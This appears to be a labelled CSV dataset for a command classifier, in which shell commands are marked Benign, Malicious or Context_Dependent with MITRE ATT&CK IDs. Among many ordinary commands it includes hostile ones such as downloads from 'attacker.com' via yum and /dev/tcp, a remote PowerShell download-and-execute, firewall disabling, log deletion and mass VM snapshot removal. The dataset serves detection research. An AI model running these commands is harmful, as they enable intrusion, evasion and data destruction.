command,label,original_label,mitre_id
supervisorctl update,Benign,Benign,Benign
sudo cp $path_malicious_plist /tmp/T1037_005_agent.plist,Malicious,Malicious,T1037
getArch.py -target target -timeout seconds,Benign,Benign,Benign
sudo alien [-t|--to-tgz] path/to/file,Benign,Benign,Benign
dpkg-query [-l|--list] 'libc6*',Benign,Benign,Benign
hx --tutor,Benign,Benign,Benign
piactl login path/to/login_file,Benign,Benign,Benign
jarsigner path/to/file.jar keystore_alias,Benign,Benign,Benign
find / -nouser -print,Context_Dependent,Benign,Benign
packwiz modrinth|curseforge export,Benign,Benign,Benign
bunx --bun package_name,Benign,Benign,Benign
git fast-export --progress n --all > path/to/file,Benign,Benign,Benign
sudo ufw disable,Benign,Benign,Benign
distcc --help,Benign,Benign,Benign
rofi -show window,Benign,Benign,Benign
steamos-chroot [-h|--help],Benign,Benign,Benign
Invoke-WebRequest http://example.com -OutFile path\to\file,Benign,Benign,Benign
pbmtomda path/to/image.pbm > path/to/output.mda,Benign,Benign,Benign
phpenv global version,Benign,Benign,Benign
find -type f | xargs chmod 775,Benign,Benign,Benign
tar -I pbzip2 -cf OUTPUT_FILE.tar.bz2 paths_to_archive,Benign,Benign,Benign
ppmrainbow color1 color2 ... > path/to/output_file.ppm,Benign,Benign,Benign
setfont font.gz,Benign,Benign,Benign
~/Library/.DS_Stores/,Malicious,Malicious,T1564
z -r string,Benign,Benign,Benign
godot [-p|--project-manager],Benign,Benign,Benign
HKCU\Software\Classes\http\shell\open\command,Context_Dependent,Malicious,T1012
play path/to/audio_file reverse,Benign,Benign,Benign
dirb https://example.org -a user_agent_string -c cookie_string,Benign,Benign,Benign
audtool playlist-advance,Benign,Benign,Benign
spicetify apply,Benign,Benign,Benign
git checkout-index [-a|--all] [-f|--force],Benign,Benign,Benign
lsscsi,Benign,Benign,Benign
"find . -type f -printf '%p %s\n' | perl -n -a -e '$sum+=$F[1]; print ""$sum\n""' | tail -n 1",Benign,Benign,Benign
pg_test_fsync [-f|--filename] path/to/file,Benign,Benign,Benign
"find . -name ""*.py"" -exec wc -l {} \; | awk '{ SUM += $0} END { print SUM }'",Benign,Benign,Benign
launchctl stop script_file,Benign,Benign,Benign
zipcloak path/to/archive.zip,Benign,Benign,Benign
find . -maxdepth 1 -type d -empty,Benign,Benign,Benign
"FOLDERS=$(find . -type d -print0 | tr '\0' ',')",Benign,Benign,Benign
find . -type f -newerct 2008-09-29 ! -newerct 2008-09-30,Benign,Benign,Benign
paclog --package package_name,Benign,Benign,Benign
yum install http://attacker.com/path/to/input-file.rpm,Malicious,Malicious,T1105
echo 'string to be hashed' | md5,Benign,Benign,Benign
flox uninstall package,Benign,Benign,Benign
rsync 6.3.3/6.3.3/macosx/bin/mybinary ~/work/binaries/macosx/6.3.3/,Benign,Benign,Benign
sestatus,Benign,Benign,Benign
"cal | awk 'NR>2{Sfields=7-NF; if (Sfields == 0 ) {printf ""%02d\n"",$3;exit}}'",Benign,Benign,Benign
pvesm [r|remove] storage_name,Benign,Benign,Benign
"find /home/u20806/public_html -maxdepth 1 -mmin +25 -type f -name ""*.txt"" -delete",Context_Dependent,Benign,Benign
Remove-EventLog -LogName Security,Malicious,Malicious,T1070
lrztar [-p|--threads] 8 path/to/directory,Benign,Benign,Benign
portageq repos_config /,Benign,Benign,Benign
sudo aa-complain path/to/profile1 path/to/profile2 ...,Benign,Benign,Benign
gsettings get org.example.schema example-key,Benign,Benign,Benign
geth --testnet,Benign,Benign,Benign
logins.json,Malicious,Malicious,T1552
minifab install [-n|--chaincode-name] chaincode_name,Benign,Benign,Benign
xcv l,Benign,Benign,Benign
systemctl soft-reboot [-f|--force],Benign,Benign,Benign
type zip,Context_Dependent,Synthetic,Synthetic
cage -- application arguments,Benign,Benign,Benign
truncate [-s|--size] -2G path/to/file,Benign,Benign,Benign
sstat [-e|--helpformat],Benign,Benign,Benign
pveam [a|available],Benign,Benign,Benign
fsutil volume list,Benign,Benign,Benign
systemctl try-restart unit1 unit2 ...,Benign,Benign,Benign
DuplicateTokenEx,Malicious,Malicious,T1134
reg.py domain/username:password@target query -keyName 'HKLM\SOFTWARE\Microsoft\Windows' -s,Benign,Benign,Benign
"seq -s ""*"" 1 500 |bc",Benign,Benign,Benign
dstat --xxx,Malicious,Malicious,T1548
cat file.txt | fold,Benign,Benign,Benign
ssh -L 9999:example.org:80 -N -T username@remote_host,Context_Dependent,Benign,Benign
gh pr merge pr_number [-sd|--squash --delete-branch],Benign,Benign,Benign
lsix,Benign,Benign,Benign
"zformat -f variable ""%-10c"" c:hello",Benign,Benign,Benign
awww restore,Benign,Benign,Benign
pickle convert path/to/directory,Benign,Benign,Benign
tldr pamtopng,Benign,Benign,Benign
hostname -s,Context_Dependent,Synthetic,Synthetic
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'),Context_Dependent,Malicious,T1082
aurman [-S|--sync] [-s|--search] keyword,Benign,Benign,Benign
retry command,Benign,Benign,Benign
list resources;,Benign,Benign,Benign
skopeo inspect docker://registry_hostname/image:tag,Benign,Benign,Benign
ghdl -s filename.vhdl,Benign,Benign,Benign
cal -h | cut -c 4-17 | tail -n +3,Benign,Benign,Benign
find /home -perm /a=x,Context_Dependent,Benign,Benign
mac-cleanup [-n|--dry-run],Benign,Benign,Benign
git bulk --removeworkspace workspace_name,Benign,Benign,Benign
urpmq --list-media --list-url,Benign,Benign,Benign
find . -name something -print | head -n 5,Benign,Benign,Benign
tail -50 /var/log/apache2/error.log,Context_Dependent,Synthetic,Synthetic
megatools-dl --limit-speed speed https://mega.nz/...,Benign,Benign,Benign
"echo ""error"" 1>&2 | tee -a log",Benign,Benign,Benign
pbmtoepsi [-d|-dpi] 72x144 path/to/image.pbm > path/to/output.bmp,Benign,Benign,Benign
"rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}",Malicious,Malicious,T1218
limine bios-install /dev/sdX,Benign,Benign,Benign
find ./ -type f -newer /tmp/date.start ! -newer /tmp/date.end -exec rm {} \;,Benign,Benign,Benign
requestbin.net,Malicious,Malicious,T1071
tye deploy,Benign,Benign,Benign
mssync.exe,Malicious,Malicious,T1036
sudo eclean [-d|--deep] [-n|--package-names] distfiles,Benign,Benign,Benign
pm2 list,Benign,Benign,Benign
gocr -m 130 -p path/to/db_directory -i path/to/input_image.png -o path/to/output_file.txt -a 100,Benign,Benign,Benign
sed ':a;N;$!ba;s/\n/ /g',Benign,Benign,Benign
dnsenum target.com,Context_Dependent,Synthetic,Synthetic
"dir=$(dirname -- ""$1"")",Benign,Benign,Benign
cd $test_folder; touch a b c d e f g,Malicious,Malicious,T1560
cp /file/that/exists /location/for/new/file,Benign,Benign,Benign
npm org rm organization_name username,Benign,Benign,Benign
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 0 /f",Malicious,Malicious,T1562
{42aedc87-2188-41fd-b9a3-0c966feabec1},Malicious,Malicious,T1546
docker [rm|container rm] [-v|--volumes] container,Benign,Benign,Benign
rga --rga-list-adapters,Benign,Benign,Benign
hxxp://google.com@1157586937,Malicious,Malicious,T1566
find /some/path -type f ! -perm -111 -ls,Benign,Benign,Benign
"echo ""# Required-Start: \$all"" >> /etc/init.d/T1543.002",Malicious,Malicious,T1543
unlink /var/log/messages,Malicious,Malicious,T1070
lci path/to/file,Benign,Benign,Benign
"kubectl run $pod_name --image=$image_name --restart=Never --attach --rm -i -- bash -lc ""apt-get update -y >/dev/null 2>&1 && apt-get install -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo '$at_command' | at $time_spec && at -l""",Malicious,Malicious,T1053
git name-rev HEAD~1 HEAD~2 main,Benign,Benign,Benign
pct config 100 --current,Benign,Benign,Benign
tracepath -m max_hops host,Context_Dependent,Benign,Benign
phpcpd path/to/file_or_directory,Benign,Benign,Benign
find . -maxdepth 1 -type f |wc -l,Benign,Benign,Benign
echo Aa | od -t x1,Benign,Benign,Benign
pnpm audit [-P|--prod],Benign,Benign,Benign
fonttools subset path/to/font.ttf --unicodes=U+0000-007F,Benign,Benign,Benign
"depotdownloader -app 108600 -depot 108603 -username ""gabecube"" -remember-password",Benign,Benign,Benign
luajit path/to/script.lua --optional-argument,Benign,Benign,Benign
ogr2ogr -s_srs EPSG:4326 -t_srs EPSG:3857 -f GPKG path/to/output.gpkg path/to/input.gpkg,Benign,Benign,Benign
kill -9 `pgrep -f cps_build`,Benign,Benign,Benign
dvc commit target,Benign,Benign,Benign
zotero --headless,Benign,Benign,Benign
exrex 'regex',Benign,Benign,Benign
xml [fo|format] [-H|--html] [-s|--indent-spaces] 4 path/to/input.html|URI > path/to/output.html,Benign,Benign,Benign
find . -type f -iname '*.txt' -print0 | xargs -0 mv {} {}.abc,Benign,Benign,Benign
ls -1tr * | tail -1,Benign,Benign,Benign
php artisan serve,Benign,Benign,Benign
mise install name@version,Benign,Benign,Benign
"eva ""(1 + 2) * 2 ^ 2""",Benign,Benign,Benign
sdiff [-i|--ignore-case] path/to/file1 path/to/file2,Benign,Benign,Benign
tlmgr check executes,Benign,Benign,Benign
ftxdiff --include-unicode-names,Benign,Benign,Benign
poetry config config_key --unset,Benign,Benign,Benign
find . -type f -mtime -14 | cut -b 3- > deploy.txt,Benign,Benign,Benign
sshfs username@remote_host:remote_directory -C,Benign,Benign,Benign
scalafmt,Benign,Benign,Benign
pnmnlfilt -0.9..(-0.1) radius path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
echo '# KEYWORD: shutdown' >> $rc_service_path/$rc_service_file,Malicious,Malicious,T1543
lazygit status|branch|log|stash|...,Benign,Benign,Benign
llvd [-c|--course] course-slug --cookies,Benign,Benign,Benign
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")",Malicious,Malicious,T1218
xclock -digital -twelve -brief,Benign,Benign,Benign
Install-Module module -RequiredVersion version,Benign,Benign,Benign
curl -s http://169.254.169.254/latest/user-data,Context_Dependent,Synthetic,Synthetic
find ~ -group vboxusers -exec chown kent:kent {} \;,Benign,Benign,Benign
tldr md5sum,Benign,Benign,Benign
dmesg | grep -i memory,Benign,Benign,Benign
argospm update,Benign,Benign,Benign
torify -P proxy command,Benign,Benign,Benign
brew bundle cleanup --force,Benign,Benign,Benign
asciiart [-i|--invert-chars] path/to/image.jpg,Benign,Benign,Benign
ping host | x ping vis [-m|--heatmap],Benign,Benign,Benign
nixos-option option_key,Benign,Benign,Benign
gh completion,Benign,Benign,Benign
"kaggle [c|competitions] submit competition_name [-f|--file] path/to/file [-m|--message] ""message""",Benign,Benign,Benign
zinit completions,Benign,Benign,Benign
racket [-l|--lib] module_name [-m|--main] arguments,Benign,Benign,Benign
tldr argos-translate,Benign,Benign,Benign
docker node update --availability|role|label-add|... active|worker|... node1,Benign,Benign,Benign
cat /var/log/maillog,Context_Dependent,Synthetic,Synthetic
ark [-t|--add-to] path/to/archive path/to/file1 path/to/file2 ...,Benign,Benign,Benign
"tail -f logfile.log | grep --line-buffered ""something"" | read -t 3",Benign,Benign,Benign
"bash -c 'echo ""$(</dev/tcp/attacker.com/12345) >/path/to/output-file'",Malicious,Malicious,T1105
"Add-MailboxPermission -Identity ""$delegate_target"" -User ""$operator_mailbox"" -AccessRights FullAccess -InheritanceType All",Malicious,Malicious,T1098
find /home/ -name monfichier,Context_Dependent,Benign,Benign
find . -mtime +30 -a -mtime -7 -print0,Benign,Benign,Benign
openssl speed -mr,Benign,Benign,Benign
sync path/to/file,Benign,Benign,Benign
"roll ""2d20>10""",Benign,Benign,Benign
git stamp [-r|--replace] issue_number,Benign,Benign,Benign
yadm decrypt,Benign,Benign,Benign
java classname,Benign,Benign,Benign
vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb},Malicious,Malicious,T1127
cbatticon [-p|--list-power-supplies],Benign,Benign,Benign
gdalinfo WMS:https://services.meggsimum.de/geoserver/ows,Benign,Benign,Benign
kaggle [d|datasets] create [-p|--path] path/to/dataset [-u|--public],Benign,Benign,Benign
texliveonfly source.tex,Benign,Benign,Benign
tshark -Xlua_script:/path/to/temp-file,Malicious,Malicious,T1548
ng add package --skip-confirmation,Benign,Benign,Benign
sqsc pull queue_name,Benign,Benign,Benign
find / -mount -name 'win*',Context_Dependent,Benign,Benign
uuidd [-r|--random] [-n|--uuids] number_of_uuids,Benign,Benign,Benign
pnputil /add-driver oemXX.inf,Benign,Benign,Benign
find / -writable ! -user $(whoami) 2>/dev/null,Context_Dependent,Synthetic,Synthetic
echo '/path/to/command' >/path/to/temp-dir/bin/rustc,Malicious,Malicious,T1059
pikman autoremove,Benign,Benign,Benign
pixiecore quick --help,Benign,Benign,Benign
"find -maxdepth 1 -type f -newermt ""Nov 22"" \! -newermt ""Nov 23"" -delete",Benign,Benign,Benign
[ -e path/to/file_or_directory ],Benign,Benign,Benign
aws accessanalyzer list-analyzers,Benign,Benign,Benign
"find /Applications/ -name ""*.java"" -exec grep -i TODO {} +",Benign,Benign,Benign
loginctl show-session session_id [-a|--all],Benign,Benign,Benign
var-dump-server --format=html > path/to/file.html,Benign,Benign,Benign
aws kafka delete-cluster --cluster-arn cluster_arn,Benign,Benign,Benign
mmls -t nested_table_type -o offset path/to/image_file,Benign,Benign,Benign
find . -type f -name filename.txt -exec vi {} +,Benign,Benign,Benign
cat /etc/shells,Context_Dependent,Synthetic,Synthetic
HKLM\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\NullSessionPipes,Malicious,Malicious,T1112
cmd.exe /C quser,Context_Dependent,Malicious,T1033
helm repo [ls|list],Benign,Benign,Benign
picgo upload path/to/image,Benign,Benign,Benign
prowler azure [-c|--checks] storage_blob_public_access_level_is_disabled,Benign,Benign,Benign
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done""",Malicious,Malicious,T1485
chafa --symbols vhalf path/to/file,Benign,Benign,Benign
thunderbird -P profile_name,Benign,Benign,Benign
timedatectl set-timezone timezone,Benign,Benign,Benign
raco pkg install --auto package_source,Benign,Benign,Benign
